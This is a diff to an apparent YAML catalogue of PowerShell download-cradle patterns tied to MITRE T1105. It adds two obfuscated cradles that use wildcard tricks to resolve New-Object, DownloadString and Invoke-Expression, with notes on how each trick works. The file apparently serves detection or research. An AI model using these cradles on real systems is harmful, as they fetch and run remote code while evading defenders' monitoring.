@@ -25,7 +25,14 @@ Patterns:
   - Pattern: "& (gcm *Object) Net.WebClient"
     Wildcards: ["*"]
     Notes: "Prefix wildcard"
+  - Pattern: "$w=(& (gcm N*-O*) Net.WebClient);$w.(($w.PsObject.Methods|?{$_.Name-clike'D*g'}).Name).Invoke('http://...')"
+    Wildcards: ["*"]
+    Notes: "gcm glob resolves New-Object; -clike 'D*g' resolves DownloadString on the WebClient instance via PSObject.Methods"
+  - Pattern: "$w=(& (gcm N*-O*) Net.WebClient);$w.(($w.PsObject.Methods|?{$_.Name-clike'D*g'}).Name).Invoke('http://...')|&(DIR Alias:/I*X)"
+    Wildcards: ["*"]
+    Notes: "Triple-glob cradle: gcm on New-Object + -clike on DownloadString + DIR Alias:/I*X on IEX"
 Resources:
   - https://attack.mitre.org/techniques/T1105/
   - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object
+  - https://gist.github.com/mgeeky/3b11169ab77a7de354f4111aa2f0df38
 ---
